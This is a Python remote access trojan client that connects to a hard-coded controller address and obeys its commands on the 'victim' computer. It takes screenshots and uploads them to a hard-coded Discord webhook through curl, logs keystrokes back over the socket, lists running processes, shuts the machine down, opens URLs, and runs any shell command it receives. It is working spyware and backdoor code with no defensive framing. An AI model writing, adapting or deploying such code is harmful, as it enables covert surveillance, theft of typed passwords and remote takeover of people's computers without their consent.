import socket
from typing import *
import sys
import os
import webbrowser
from PIL import ImageGrab
import subprocess
class Client():
    def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
        self.client=c
        self._recv()
    def _recv(self) -> None:
        # Receive Command
        self.command=self.client.recv(99999).decode()
        # Screenshot
        if self.command=="screenshot":
            self.send_screenshot_to_discord()
            self.client.send("Sending Screenshot To Discord".encode()) # Read Webhook From Config File (Future)
        # Operating System Name
        if self.command=="os_name":
            self.client.send(f"Victim Is Using {self.os_name}".encode())
        # Windows Username
        if self.command=="windows_username":
            try:
                import win32api
                self.client.send(f"Victim's Windows Username : {win32api.GetUserName()}".encode())
            except ImportError:
                self.client.send("win32api Isn't Installed In Victim's PC Or Victim Is Not Using Windows".encode())
        # Shutdown PC
        if self.command=="shutdown_pc":
            # Get Operating System Type
            if sys.platform=="win32":
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("shutdown /s /t 1")
            elif sys.platform=="darwin":
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("shutdown -h now")
            else:
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("poweroff")
        # Open URL
        if self.command.startswith("open_url"):
            _,_URL_TO_OPEN=self.command.split()
            webbrowser.open(_URL_TO_OPEN)
            self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
        # Log Keys
        if self.command=="log_keys":
            try:
                import pynput
                with pynput.keyboard.Listener(on_press=self.log_keys) as listener:
                    listener.join()
            except ImportError:
                self.client.send("pynput Isn't Installed In Victim's PC".encode())
            except:
                self.client.send("Something Went Wrong!".encode())
        # Get All Running Process
        if self.command=="get_running_process":
            ps=self.get_running_process().encode()
            self.client.send(ps)
        # Open Bash
        if self.command=="open_bash":
            while True:
                _bash_cmd=self.client.recv(99999).decode()
                subprocess.Popen([_bash_cmd],shell=True)
    @property
    def os_name(self) -> str:
        if sys.platform=="win32":
            return "Windows"
        elif sys.platform=="darwin":
            return "Mac OS"
        elif sys.platform=="linux":
            return "Linux"
        else:
            return "Other"
    def send_screenshot_to_discord(self) -> None:
        ImageGrab.grab().save("screenshot.png")
        _temp_path=os.path.join(os.getcwd(),"screenshot.png")
        subprocess.getoutput(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
    def log_keys(self,key:Any) -> None:
        self.client.send(str(key).encode())
    def get_running_process(self) -> str:
        if sys.platform=="win32":
            try:
                import wmi
                w=wmi.WMI()
                ps=""
                for i in w.Win32_Process():
                    ps+=f"{i.Name}\t\t{i.ProcessId}\n"
                return ps
            except:
                return "wmi Isn't Installed In Victim's PC"
        else:
            return subprocess.getoutput("ps")
    @staticmethod
    def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
        c=socket.socket()
        c.connect((_addr,_port))
        return c,_addr
if __name__ == "__main__":
    # c,addr=Client.init_socket("0.tcp.in.ngrok.io",13592)
    c,addr=Client.init_socket("192.168.29.94",9999)
    client=Client(c,addr)